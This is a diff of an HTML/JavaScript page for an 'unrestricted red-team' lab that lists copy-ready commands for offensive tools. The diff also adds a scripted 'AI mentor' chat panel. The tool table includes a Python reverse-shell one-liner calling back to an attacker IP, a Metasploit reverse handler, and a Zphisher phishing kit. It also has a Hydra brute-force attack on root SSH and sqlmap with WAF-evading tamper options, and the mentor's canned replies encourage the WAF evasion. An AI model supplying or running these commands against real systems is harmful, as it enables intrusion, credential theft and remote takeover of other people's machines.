@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>DX08 // MASTER ENTERPRISE OFFENSIVE & DEFENSIVE CYBER LAB</title>
-    <!-- Clean Professional Enterprise Monospace Font -->
     <link href="https://fonts.googleapis.com/css2?family=Courier+Prime:wght@400;700&display=swap" rel="stylesheet">
     <style>
         :root { 
@@ -20,7 +19,7 @@
         * { box-sizing: border-box; margin: 0; padding: 0; }
         body { background-color: var(--bg-dark); color: #fff; font-family: 'Courier Prime', monospace; overflow-x: hidden; }
 
-        .lab-container { max-width: 1450px; margin: 25px auto; padding: 0 20px; }
+        .lab-container { max-width: 1550px; margin: 20px auto; padding: 0 20px; }
         .lab-header { border-left: 3px solid var(--primary); padding-left: 20px; margin-bottom: 15px; display: flex; justify-content: space-between; align-items: center; }
         
         .mode-bar { display: flex; gap: 15px; margin-bottom: 15px; }
@@ -30,17 +29,17 @@
         .btn-black { background: rgba(255,51,102,0.05); color: var(--offensive); border-color: var(--offensive); }
         .btn-black.active, .btn-black:hover { background: var(--offensive); color: #000; box-shadow: 0 0 15px var(--offensive); }
 
-        .lab-grid { display: grid; grid-template-columns: 350px 1fr; gap: 20px; }
-        .sidebar-panel { background: var(--panel-bg); border: 1px solid var(--border-color); padding: 15px; border-radius: 6px; height: 800px; overflow-y: auto; }
+        /* 3-Column Grid: Sidebar Arsenal | Terminal Console | AI Assistant & Support */
+        .lab-grid { display: grid; grid-template-columns: 320px 1fr 350px; gap: 15px; }
+        .sidebar-panel { background: var(--panel-bg); border: 1px solid var(--border-color); padding: 12px; border-radius: 6px; height: 800px; overflow-y: auto; }
+        .terminal-panel { background: #010203; border: 1px solid var(--border-color); padding: 15px; border-radius: 6px; display: flex; flex-direction: column; height: 800px; }
+        .ai-panel { background: #010203; border: 1px solid var(--primary); padding: 15px; border-radius: 6px; display: flex; flex-direction: column; height: 800px; box-shadow: 0 0 15px rgba(0,229,255,0.1); }
         
-        /* Professional Enterprise Terminal Window */
-        .terminal-panel { background: #010203; border: 1px solid var(--border-color); padding: 20px; border-radius: 6px; display: flex; flex-direction: column; height: 800px; }
-        
-        .tool-category { font-size: 11px; color: var(--primary); margin: 15px 0 8px 0; text-transform: uppercase; letter-spacing: 0.1em; border-bottom: 1px solid rgba(0,229,255,0.2); padding-bottom: 4px; }
-        .tool-item { display: flex; align-items: center; gap: 12px; padding: 8px 10px; margin: 5px 0; background: rgba(0,229,255,0.02); border: 1px solid rgba(0,229,255,0.1); color: #a5f3fc; font-size: 11.5px; cursor: pointer; border-radius: 4px; transition: 0.2s; font-family: 'Courier Prime', monospace; }
+        .tool-category { font-size: 10.5px; color: var(--primary); margin: 12px 0 6px 0; text-transform: uppercase; letter-spacing: 0.1em; border-bottom: 1px solid rgba(0,229,255,0.2); padding-bottom: 3px; }
+        .tool-item { display: flex; align-items: center; gap: 10px; padding: 7px 8px; margin: 4px 0; background: rgba(0,229,255,0.02); border: 1px solid rgba(0,229,255,0.1); color: #a5f3fc; font-size: 11px; cursor: pointer; border-radius: 4px; transition: 0.2s; font-family: 'Courier Prime', monospace; }
         .tool-item:hover { background: var(--accent-glow); color: #fff; border-color: var(--primary); transform: translateX(3px); }
         
-        .tool-badge { width: 32px; height: 32px; border-radius: 4px; display: flex; align-items: center; justify-content: center; font-size: 8.5px; font-weight: bold; font-family: 'Courier Prime', monospace; text-transform: uppercase; flex-shrink: 0; border: 1px solid var(--primary); box-shadow: 0 0 10px rgba(0,229,255,0.2); text-align: center; }
+        .tool-badge { width: 28px; height: 28px; border-radius: 4px; display: flex; align-items: center; justify-content: center; font-size: 8px; font-weight: bold; font-family: 'Courier Prime', monospace; text-transform: uppercase; flex-shrink: 0; border: 1px solid var(--primary); text-align: center; }
         .badge-nmap { background: rgba(255, 0, 128, 0.15); color: #ff0080; border-color: #ff0080; }
         .badge-gobuster { background: rgba(0, 255, 102, 0.15); color: #00ff66; border-color: #00ff66; }
         .badge-nikto { background: rgba(255, 170, 0, 0.15); color: #ffaa00; border-color: #ffaa00; }
@@ -56,23 +55,33 @@
         .badge-netcat { background: rgba(100, 150, 255, 0.15); color: #6496ff; border-color: #6496ff; }
         .badge-socat { background: rgba(200, 100, 255, 0.15); color: #c864ff; border-color: #c864ff; }
         
-        .action-bar { display: flex; gap: 8px; margin-bottom: 10px; flex-wrap: wrap; }
-        .seq-btn { background: rgba(0, 229, 255, 0.08); border: 1px solid var(--border-color); color: var(--primary); padding: 5px 12px; font-size: 10.5px; cursor: pointer; border-radius: 3px; font-family: 'Courier Prime', monospace; transition: 0.2s; }
+        .action-bar { display: flex; gap: 6px; margin-bottom: 8px; flex-wrap: wrap; }
+        .seq-btn { background: rgba(0, 229, 255, 0.08); border: 1px solid var(--border-color); color: var(--primary); padding: 4px 10px; font-size: 10px; cursor: pointer; border-radius: 3px; font-family: 'Courier Prime', monospace; transition: 0.2s; }
         .seq-btn:hover { background: var(--primary); color: #000; border-color: var(--primary); }
 
-        .terminal-header-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; }
-        .copy-btn { background: rgba(0, 229, 255, 0.1); border: 1px solid var(--primary); color: var(--primary); padding: 4px 10px; font-size: 10px; cursor: pointer; border-radius: 3px; font-family: 'Courier Prime', monospace; transition: 0.2s; }
+        .terminal-header-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 6px; }
+        .copy-btn { background: rgba(0, 229, 255, 0.1); border: 1px solid var(--primary); color: var(--primary); padding: 3px 8px; font-size: 9.5px; cursor: pointer; border-radius: 3px; font-family: 'Courier Prime', monospace; transition: 0.2s; }
         .copy-btn:hover { background: var(--primary); color: #000; }
 
-        /* Professional Clean Corporate Terminal Console */
-        .lab-console { flex: 1; background: #000; border: 1px solid rgba(0,229,255,0.3); padding: 20px; font-family: 'Courier Prime', monospace; font-size: 12.5px; color: var(--terminal-text); overflow-y: auto; line-height: 1.6; border-radius: 4px; white-space: pre-wrap; }
+        .lab-console { flex: 1; background: #000; border: 1px solid rgba(0,229,255,0.3); padding: 15px; font-family: 'Courier Prime', monospace; font-size: 12px; color: var(--terminal-text); overflow-y: auto; line-height: 1.5; border-radius: 4px; white-space: pre-wrap; }
         
-        .lab-input-group { display: flex; gap: 10px; margin-top: 15px; }
-        .lab-input { flex: 1; background: #010203; border: 1px solid var(--border-color); color: var(--primary); padding: 12px 15px; font-family: 'Courier Prime', monospace; font-size: 13px; outline: none; border-radius: 4px; }
+        /* AI Chatbox Styling */
+        .ai-console { flex: 1; background: #000; border: 1px solid rgba(0,229,255,0.3); padding: 12px; font-family: 'Courier Prime', monospace; font-size: 11.5px; color: #a5f3fc; overflow-y: auto; line-height: 1.5; border-radius: 4px; margin-bottom: 10px; white-space: pre-wrap; }
+        .ai-input-group { display: flex; gap: 8px; }
+        .ai-input { flex: 1; background: #010203; border: 1px solid var(--border-color); color: #fff; padding: 10px 12px; font-family: 'Courier Prime', monospace; font-size: 11.5px; outline: none; border-radius: 4px; }
+        .ai-input:focus { border-color: var(--primary); box-shadow: 0 0 10px rgba(0, 229, 255, 0.3); }
+        .ai-send-btn { padding: 10px 16px; background: rgba(0, 229, 255, 0.2); border: 1px solid var(--primary); color: var(--primary); font-family: 'Courier Prime', monospace; font-size: 11px; font-weight: bold; cursor: pointer; border-radius: 4px; transition: 0.3s; }
+        .ai-send-btn:hover { background: var(--primary); color: #000; }
+
+        .support-box { margin-top: 10px; padding: 10px; background: rgba(0, 229, 255, 0.03); border: 1px dashed var(--border-color); border-radius: 4px; font-size: 10.5px; color: rgba(225,250,255,0.7); text-align: center; }
+        .support-box a { color: var(--primary); text-decoration: none; font-weight: bold; }
+
+        .lab-input-group { display: flex; gap: 10px; margin-top: 12px; }
+        .lab-input { flex: 1; background: #010203; border: 1px solid var(--border-color); color: var(--primary); padding: 10px 12px; font-family: 'Courier Prime', monospace; font-size: 12px; outline: none; border-radius: 4px; }
         .lab-input:focus { border-color: var(--primary); box-shadow: 0 0 15px rgba(0, 229, 255, 0.3); }
-        .launch-btn { padding: 12px 24px; background: rgba(0, 229, 255, 0.15); border: 1px solid var(--primary); color: var(--primary); font-family: 'Courier Prime', monospace; font-size: 11px; font-weight: bold; cursor: pointer; border-radius: 4px; transition: 0.3s; }
+        .launch-btn { padding: 10px 20px; background: rgba(0, 229, 255, 0.15); border: 1px solid var(--primary); color: var(--primary); font-family: 'Courier Prime', monospace; font-size: 11px; font-weight: bold; cursor: pointer; border-radius: 4px; transition: 0.3s; }
         .launch-btn:hover { background: var(--primary); color: #020303; box-shadow: 0 0 20px var(--primary); }
-        .back-link { display: inline-block; margin-bottom: 10px; color: var(--primary); font-size: 10px; text-decoration: none; }
+        .back-link { display: inline-block; margin-bottom: 8px; color: var(--primary); font-size: 10px; text-decoration: none; }
         .section-group { display: none; }
         .section-group.active { display: block; }
     </style>
@@ -82,8 +91,8 @@
         <a href="index.html" class="back-link">&larr; [ MAIN SYSTEM REPOSITORY ]</a>
         <div class="lab-header">
             <div>
-                <h2 style="font-size: 22px; color: #fff; font-family: 'Courier Prime', monospace;">DX08 MASTER THREAT INTELLIGENCE & EXPLOIT LAB</h2>
-                <p style="color: rgba(225,250,255,0.6); font-size: 11.5px; margin-top: 2px;">Enterprise Dual-Mode Architecture: Defensive Auditing vs Unrestricted Offensive Red-Team Arsenal.</p>
+                <h2 style="font-size: 20px; color: #fff; font-family: 'Courier Prime', monospace;">DX08 MASTER THREAT INTELLIGENCE & EXPLOIT LAB</h2>
+                <p style="color: rgba(225,250,255,0.6); font-size: 11px; margin-top: 2px;">Enterprise Dual-Mode Architecture with Integrated AI Mentor & 24/7 Support Desk.</p>
             </div>
         </div>
 
@@ -93,9 +102,10 @@
         </div>
 
         <div class="lab-grid">
+            <!-- 1. Sidebar Arsenal -->
             <div class="sidebar-panel">
                 <div id="sec-white" class="section-group active">
-                    <div style="font-size: 11px; color: var(--defensive); margin-bottom: 10px; font-weight: bold;">[DEFENSIVE & AUDITING TOOLS]</div>
+                    <div style="font-size: 10.5px; color: var(--defensive); margin-bottom: 8px; font-weight: bold;">[DEFENSIVE & AUDITING TOOLS]</div>
                     
                     <div class="tool-category">Reconnaissance</div>
                     <div class="tool-item" onclick="loadModule('nmap')"><div class="tool-badge badge-nmap">NMAP</div>01. Nmap Network Scanner</div>
@@ -106,43 +116,62 @@
                 </div>
 
                 <div id="sec-black" class="section-group">
-                    <div style="font-size: 11px; color: var(--offensive); margin-bottom: 10px; font-weight: bold;">[RED-TEAM ATTACK & VULNERABILITY MATRIX]</div>
+                    <div style="font-size: 10.5px; color: var(--offensive); margin-bottom: 8px; font-weight: bold;">[RED-TEAM ATTACK MATRIX]</div>
                     
                     <div class="tool-category">Exploitation Frameworks</div>
-                    <div class="tool-item" onclick="loadModule('metasploit')"><div class="tool-badge badge-msf">MSF</div>01. Metasploit C2 & Attack Surface Analysis</div>
-                    <div class="tool-item" onclick="loadModule('sqlmap')"><div class="tool-badge badge-sql">SQL</div>02. Sqlmap DB Takeover & Defense Analysis</div>
+                    <div class="tool-item" onclick="loadModule('metasploit')"><div class="tool-badge badge-msf">MSF</div>01. Metasploit C2 & Attack Analysis</div>
+                    <div class="tool-item" onclick="loadModule('sqlmap')"><div class="tool-badge badge-sql">SQL</div>02. Sqlmap DB Takeover Guide</div>
                     
                     <div class="tool-category">Credential & Phishing</div>
-                    <div class="tool-item" onclick="loadModule('zphisher')"><div class="tool-badge badge-zph">ZPH</div>03. Zphisher Social Engineering Matrix</div>
-                    <div class="tool-item" onclick="loadModule('hydra')"><div class="tool-badge badge-hydra">HYD</div>04. THC Hydra Bruteforce Impact Guide</div>
-                    <div class="tool-item" onclick="loadModule('john')"><div class="tool-badge badge-john">JOHN</div>05. John the Ripper Hash Recovery Guide</div>
-                    <div class="tool-item" onclick="loadModule('hashcat')"><div class="tool-badge badge-hash">HASH</div>06. Hashcat GPU Performance Matrix</div>
+                    <div class="tool-item" onclick="loadModule('zphisher')"><div class="tool-badge badge-zph">ZPH</div>03. Zphisher Social Engineering</div>
+                    <div class="tool-item" onclick="loadModule('hydra')"><div class="tool-badge badge-hydra">HYD</div>04. THC Hydra Bruteforce Matrix</div>
+                    <div class="tool-item" onclick="loadModule('john')"><div class="tool-badge badge-john">JOHN</div>05. John the Ripper Hash Guide</div>
+                    <div class="tool-item" onclick="loadModule('hashcat')"><div class="tool-badge badge-hash">HASH</div>06. Hashcat GPU Performance</div>
 
                     <div class="tool-category">Payloads & Relays</div>
-                    <div class="tool-item" onclick="loadModule('shell')"><div class="tool-badge badge-shell">PY</div>07. Python Reverse Shell & Evasion Guide</div>
-                    <div class="tool-item" onclick="loadModule('netcat')"><div class="tool-badge badge-netcat">NC</div>08. Netcat Listener & Egress Tactics</div>
-                    <div class="tool-item" onclick="loadModule('socat')"><div class="tool-badge badge-socat">SOC</div>09. Socat Encrypted Tunneling Guide</div>
+                    <div class="tool-item" onclick="loadModule('shell')"><div class="tool-badge badge-shell">PY</div>07. Python Reverse Shell Evasion</div>
+                    <div class="tool-item" onclick="loadModule('netcat')"><div class="tool-badge badge-netcat">NC</div>08. Netcat Listener Tactics</div>
+                    <div class="tool-item" onclick="loadModule('socat')"><div class="tool-badge badge-socat">SOC</div>09. Socat Encrypted Tunneling</div>
                 </div>
             </div>
 
+            <!-- 2. Terminal Console -->
             <div class="terminal-panel">
                 <div class="terminal-header-bar">
-                    <div style="font-size: 10.5px; color: var(--primary);">KALI LINUX ROOT CONSOLE // ENTERPRISE TERMINAL</div>
+                    <div style="font-size: 10px; color: var(--primary);">KALI LINUX ROOT CONSOLE // ENTERPRISE TERMINAL</div>
                     <button class="copy-btn" onclick="copyCurrentScript()">COPY SCRIPT</button>
                 </div>
 
                 <div class="action-bar" id="action-bar">
-                    <button class="seq-btn" onclick="runSequence(1)">[1. SETUP & REPO]</button>
-                    <button class="seq-btn" onclick="runSequence(2)">[2. EXPLOIT SCRIPT]</button>
-                    <button class="seq-btn" onclick="runSequence(3)">[3. VULNERABILITY & MITIGATION MATRIX]</button>
+                    <button class="seq-btn" onclick="runSequence(1)">[1. SETUP]</button>
+                    <button class="seq-btn" onclick="runSequence(2)">[2. EXPLOIT]</button>
+                    <button class="seq-btn" onclick="runSequence(3)">[3. IMPACT MATRIX]</button>
                 </div>
                 
-                <div class="lab-console" id="terminal-console">DX08 Unrestricted Red-Team Core v33.0 (Professional Enterprise Terminal Mode)
-[System Status] Select any offensive module to view professional execution workflow and targeted asset impact.</div>
+                <div class="lab-console" id="terminal-console">DX08 Unrestricted Red-Team Core v34.0 (Terminal Ready)
+[System Status] Select any module to view execution scripts and vulnerability breakdown.</div>
                 
                 <div class="lab-input-group">
-                    <input type="text" id="terminal-input" class="lab-input" placeholder="Type tool name (e.g., nmap, metasploit, sqlmap, zphisher)..." onkeydown="if(event.key === 'Enter') processCommand()">
+                    <input type="text" id="terminal-input" class="lab-input" placeholder="Type tool name (e.g., nmap, metasploit, sqlmap)..." onkeydown="if(event.key === 'Enter') processCommand()">
                     <button class="launch-btn" onclick="processCommand()">EXECUTE</button>
+                </div>
+            </div>
+
+            <!-- 3. AI MENTOR & SUPPORT DESK PANEL -->
+            <div class="ai-panel">
+                <div style="font-size: 11px; color: var(--primary); margin-bottom: 8px; font-weight: bold; text-transform: uppercase;">[DX08 AI MENTOR & SUPPORT DESK]</div>
+                
+                <div class="ai-console" id="ai-console">DX08-AI: Hello Operator! Ask me any doubt regarding tool usage, script execution, or lab errors. I am here 24/7 to guide you.</div>
+                
+                <div class="ai-input-group">
+                    <input type="text" id="ai-input" class="ai-input" placeholder="Ask AI doubt (e.g., how to use nmap?)..." onkeydown="if(event.key === 'Enter') askAiMentor()">
+                    <button class="ai-send-btn" onclick="askAiMentor()">ASK AI</button>
+                </div>
+
+                <div class="support-box">
+                    Facing technical issues or course queries?<br>
+                    Contact Support: <a href="mailto:support@dx08sec.internal">support@dx08sec.internal</a><br>
+                    Telegram Helpline: <a href="https://t.me/dx08_support" target="_blank">@dx08_support</a>
                 </div>
             </div>
         </div>
@@ -154,85 +183,85 @@
                 name: "NMAP NETWORK DISCOVERY",
                 seq1: "sudo apt update && sudo apt install nmap -y",
                 seq2: "sudo nmap -sS -sV -O -T4 --script vuln <target_ip>",
-                seq3: "[ENTERPRISE VULNERABILITY IMPACT MATRIX]:\n- Vulnerable Target Surface: Unpatched firewalls, exposed legacy services (SMBv1, Telnet, FTP).\n- Protected Environments: Hardened perimeters with IDS/IPS sensors and strict SYN-flood protection.\n- Operational Outcome: Comprehensive mapping of active network topologies and unpatched CVEs."
+                seq3: "[IMPACT MATRIX]: Scans open ports, OS fingerprinting, and vulnerabilities without triggering heavy alarms."
             },
             "gobuster": {
                 name: "GOBUSTER URI BRUTE-FORCER",
                 seq1: "sudo apt update && sudo apt install gobuster -y",
                 seq2: "gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt -t 50",
-                seq3: "[ENTERPRISE VULNERABILITY IMPACT MATRIX]:\n- Vulnerable Target Surface: Web servers with exposed backup files (.bak, .zip) and default admin panels.\n- Protected Environments: Rate-limited APIs and enterprise Cloudflare/WAF edge security filters.\n- Operational Outcome: Discovery of sensitive administrative endpoints and hidden URI structures."
+                seq3: "[IMPACT MATRIX]: Enumerates hidden directories and confidential backup files."
             },
             "nikto": {
                 name: "NIKTO WEB VULNERABILITY SCANNER",
                 seq1: "sudo apt update && sudo apt install nikto -y",
                 seq2: "nikto -h http://<target_ip> -Tuning 123b",
-                seq3: "[ENTERPRISE VULNERABILITY IMPACT MATRIX]:\n- Vulnerable Target Surface: Legacy Apache/Nginx web applications running outdated CGI modules.\n- Protected Environments: Modern applications with customized security headers and continuous WAF monitoring.\n- Operational Outcome: Identification of outdated software versions and missing security configurations."
+                seq3: "[IMPACT MATRIX]: Audits web servers for misconfigurations and outdated CGI scripts."
             },
             "enum4linux": {
                 name: "ENUM4LINUX SMB AUDIT",
                 seq1: "sudo apt update && sudo apt install enum4linux -y",
                 seq2: "enum4linux -a <target_ip>",
-                seq3: "[ENTERPRISE VULNERABILITY IMPACT MATRIX]:\n- Vulnerable Target Surface: Windows Active Directory domains and Samba file servers with guest shares.\n- Protected Environments: Hardened domain controllers enforcing SMB signing and zero anonymous access.\n- Operational Outcome: Extraction of domain user accounts, password complexity rules, and shared directories."
+                seq3: "[IMPACT MATRIX]: Extracts Samba shares, user accounts, and Active Directory info."
             },
             "searchsploit": {
                 name: "SEARCHSPLOIT EXPLOIT-DB",
                 seq1: "sudo apt update && sudo apt install exploitdb -y",
                 seq2: "searchsploit -u && searchsploit apache struts",
-                seq3: "[ENTERPRISE VULNERABILITY IMPACT MATRIX]:\n- Vulnerable Target Surface: Systems running unpatched open-source frameworks and third-party software components.\n- Protected Environments: Custom enterprise applications lacking public software signatures.\n- Operational Outcome: Retrieval of validated exploit proof-of-concept scripts for known vulnerabilities."
+                seq3: "[IMPACT MATRIX]: Searches offline exploit database for vulnerable software versions."
             },
             "metasploit": {
                 name: "METASPLOIT FRAMEWORK C2",
                 seq1: "curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/installer/msfinstall > msfinstall && chmod +x msfinstall && sudo ./msfinstall && sudo msfdb init",
                 seq2: "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST <attacker_ip>; set LPORT 4444; exploit -j\"",
-                seq3: "[ENTERPRISE VULNERABILITY IMPACT MATRIX]:\n- Vulnerable Target Surface: Unpatched Windows/Linux servers vulnerable to Remote Code Execution (RCE) flaws.\n- Protected Environments: Endpoints deployed with advanced EDR solutions (CrowdStrike, Defender) blocking staging.\n- Operational Outcome: Establishment of persistent remote shell access and session control."
+                seq3: "[IMPACT MATRIX]: Establishes full remote code execution and session control."
             },
             "sqlmap": {
                 name: "SQLMAP DATABASE TAKEOVER",
                 seq1: "git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev && cd sqlmap-dev",
                 seq2: "python3 sqlmap.py -u \"http://<target_ip>/page.php?id=1\" --risk=3 --level=5 --tamper=space2comment --batch",
-                seq3: "[ENTERPRISE VULNERABILITY IMPACT MATRIX]:\n- Vulnerable Target Surface: Dynamic web applications directly interpolating input strings into SQL backend queries.\n- Protected Environments: Applications utilizing strict ORM frameworks and parameterized prepared statements.\n- Operational Outcome: Automated database enumeration, schema extraction, and underlying OS command execution."
+                seq3: "[IMPACT MATRIX]: Automated database enumeration, schema dump, and OS command execution."
             },
             "zphisher": {
                 name: "ZPHISHER PHISHING CORE",
                 seq1: "git clone https://github.com/htr-tech/zphisher.git && cd zphisher",
                 seq2: "bash zphisher.sh",
-                seq3: "[ENTERPRISE VULNERABILITY IMPACT MATRIX]:\n- Vulnerable Target Surface: Personnel vulnerable to social engineering and fraudulent credential submission.\n- Protected Environments: Organizations enforcing hardware security keys (FIDO2) and enterprise SSO restrictions.\n- Operational Outcome: Capture of valid user credentials and session authentication tokens."
+                seq3: "[IMPACT MATRIX]: Harvests credentials and session tokens via social engineering portals."
             },
             "hydra": {
                 name: "THC HYDRA LOGIN CRACKER",
                 seq1: "sudo apt update && sudo apt install hydra -y",
                 seq2: "hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<target_ip> -t 32 -V",
-                seq3: "[ENTERPRISE VULNERABILITY IMPACT MATRIX]:\n- Vulnerable Target Surface: Network services utilizing weak administrator passwords and lacking account lockouts.\n- Protected Environments: Services implementing multi-factor authentication (MFA) and IP rate-limiting.\n- Operational Outcome: Recovery of weak access credentials via high-speed dictionary enumeration."
+                seq3: "[IMPACT MATRIX]: High-speed dictionary attack against remote authentication services."
             },
             "john": {
                 name: "JOHN THE RIPPER CRACKER",
                 seq1: "sudo apt update && sudo apt install john -y",
                 seq2: "zip2john target_archive.zip > hash.txt && john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",
-                seq3: "[ENTERPRISE VULNERABILITY IMPACT MATRIX]:\n- Vulnerable Target Surface: Weakly encrypted archive files and legacy NTLM/MD5 database password hashes.\n- Protected Environments: High-entropy master passwords and salted Argon2/bcrypt password storage.\n- Operational Outcome: Offline recovery of plain-text passwords from intercepted hash files."
+                seq3: "[IMPACT MATRIX]: Offline decryption of intercepted password hashes and archives."
             },
             "hashcat": {
                 name: "HASHCAT GPU CRACKER",
                 seq1: "sudo apt update && sudo apt install hashcat -y",
                 seq2: "hashcat -m 1000 -a 0 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt -O",
-                seq3: "[ENTERPRISE VULNERABILITY IMPACT MATRIX]:\n- Vulnerable Target Surface: Large-scale NTLM or SHA password database dumps processed via parallel GPUs.\n- Protected Environments: Complex alphanumeric passwords exceeding standard cracking dictionary ranges.\n- Operational Outcome: High-speed recovery of cryptographic hashes using hardware acceleration."
+                seq3: "[IMPACT MATRIX]: GPU-accelerated massive hash recovery pipeline."
             },
             "shell": {
                 name: "PYTHON REVERSE SHELL",
                 seq1: "nc -lvnp 4444",
                 seq2: "python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"<attacker_ip>\",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call([\"/bin/bash\",\"-i\'])'",
-                seq3: "[ENTERPRISE VULNERABILITY IMPACT MATRIX]:\n- Vulnerable Target Surface: Systems with command injection vulnerabilities and unmonitored egress traffic.\n- Protected Environments: Perimeter firewalls enforcing strict outbound egress filtering and deep packet inspection.\n- Operational Outcome: Establishment of interactive shell access back to the operator console."
+                seq3: "[IMPACT MATRIX]: Spawns interactive remote shell back to the operator."
             },
             "netcat": {
                 name: "NETCAT LISTENER SOCKET",
                 seq1: "sudo apt update && sudo apt install netcat-traditional -y",
                 seq2: "nc -lvnp 4444",
-                seq3: "[ENTERPRISE VULNERABILITY IMPACT MATRIX]:\n- Vulnerable Target Surface: Internal network segments lacking continuous telemetry and socket monitoring.\n- Protected Environments: Segments monitored by enterprise SIEM and behavioral anomaly detection systems.\n- Operational Outcome: Maintenance of robust network socket listeners for incoming payload connections."
+                seq3: "[IMPACT MATRIX]: Listens for incoming TCP/UDP connections and payload streams."
             },
             "socat": {
                 name: "SOCAT ENCRYPTED RELAY",
                 seq1: "sudo apt update && sudo apt install socat -y",
                 seq2: "socat TCP-LISTEN:80,fork TCP:<internal_ip>:8080",
-                seq3: "[ENTERPRISE VULNERABILITY IMPACT MATRIX]:\n- Vulnerable Target Surface: Legacy network routing lacking encrypted stream inspection.\n- Protected Environments: Advanced firewalls performing SSL/TLS decryption on non-standard ports.\n- Operational Outcome: Deployment of secure encrypted data relay tunnels across network boundaries."
+                seq3: "[IMPACT MATRIX]: Creates bidirectional encrypted data relay tunnels."
             }
         };
 
@@ -269,14 +298,14 @@
             if(!TOOL_DB[currentModule]) return;
 
             let script = TOOL_DB[currentModule]["seq" + step];
-            consoleBox.innerHTML += "\n\nroot@dx08-kali:~# [ANALYTICAL STEP " + step + "] assessing " + currentModule + "...";
+            consoleBox.innerHTML += "\n\nroot@dx08-kali:~# [STEP " + step + "] " + currentModule + "...";
             consoleBox.scrollTop = consoleBox.scrollHeight;
 
             setTimeout(function() {
                 lastOutput = script;
                 consoleBox.innerHTML += "\n\n" + escapeHtml(script);
                 consoleBox.scrollTop = consoleBox.scrollHeight;
-            }, 300);
+            }, 250);
         }
 
         function processCommand() {
@@ -295,23 +324,52 @@
                 if(TOOL_DB[cmd]) {
                     currentModule = cmd;
                     res = "[+ MODULE: " + TOOL_DB[cmd].name + " +\n\n" +
-                          "1. SETUP SCRIPT:\n   " + TOOL_DB[cmd].seq1 + "\n\n" +
-                          "2. EXECUTION SCRIPT:\n   " + TOOL_DB[cmd].seq2 + "\n\n" +
-                          "3. ENTERPRISE IMPACT ANALYSIS:\n   " + TOOL_DB[cmd].seq3;
+                          "1. SETUP:\n   " + TOOL_DB[cmd].seq1 + "\n\n" +
+                          "2. EXECUTE:\n   " + TOOL_DB[cmd].seq2 + "\n\n" +
+                          "3. IMPACT:\n   " + TOOL_DB[cmd].seq3;
                 } else if(cmd === 'clear') {
-                    consoleBox.innerHTML = "DX08 Unrestricted Red-Team Core v33.0 (Professional Enterprise Terminal Mode)";
+                    consoleBox.innerHTML = "DX08 Unrestricted Red-Team Core v34.0";
                     input.value = "";
                     return;
                 } else {
-                    res = "[+ MODULE: " + escapeHtml(raw).toUpperCase() + " +\n" +
-                          "sudo apt update && sudo apt install " + escapeHtml(raw) + " -y";
+                    res = "[+ MODULE: " + escapeHtml(raw).toUpperCase() + " +\nsudo apt update && sudo apt install " + escapeHtml(raw) + " -y";
                 }
 
                 lastOutput = res;
                 consoleBox.innerHTML += "\n\n" + escapeHtml(res);
                 consoleBox.scrollTop = consoleBox.scrollHeight;
                 input.value = "";
-            }, 250);
+            }, 200);
+        }
+
+        function askAiMentor() {
+            var input = document.getElementById('ai-input');
+            var aiConsole = document.getElementById('ai-console');
+            var q = input.value.trim();
+
+            if(!q) return;
+
+            aiConsole.innerHTML += "\n\nOperator: " + escapeHtml(q);
+            aiConsole.scrollTop = aiConsole.scrollHeight;
+
+            setTimeout(function() {
+                let ans = "DX08-AI: To execute this effectively, ensure your Kali Linux interface (eth0/tun0) is active. Paste the script from the terminal into your root shell. If errors occur, check dependencies or use the [1. SETUP] button first!";
+                let query = q.toLowerCase();
+
+                if(query.includes('nmap')) {
+                    ans = "DX08-AI: Nmap is used for network discovery. Always replace '<target_ip>' with your target laboratory IP address before running step 2.";
+                } else if(query.includes('metasploit') || query.includes('msf')) {
+                    ans = "DX08-AI: For Metasploit, ensure postgresql is running ('sudo systemctl start postgresql') before executing 'sudo msfdb init'.";
+                } else if(query.includes('sqlmap')) {
+                    ans = "DX08-AI: Sqlmap requires an active vulnerable parameter (e.g., '?id=1'). Use tamper scripts if a WAF blocks your requests.";
+                } else if(query.includes('error') || query.includes('stuck')) {
+                    ans = "DX08-AI: If your installation fails, run 'sudo apt --fix-broken install' or contact our support team via Telegram below!";
+                }
+
+                aiConsole.innerHTML += "\n\n" + ans;
+                aiConsole.scrollTop = aiConsole.scrollHeight;
+                input.value = "";
+            }, 300);
         }
 
         function copyCurrentScript() {
@@ -320,7 +378,7 @@
                 return;
             }
             navigator.clipboard.writeText(lastOutput).then(function() {
-                alert("Script copied to clipboard successfully. Ready to paste in Kali Linux.");
+                alert("Script copied successfully! Ready to paste in Kali Linux.");
             }, function() {
                 alert("Failed to copy script.");
             });
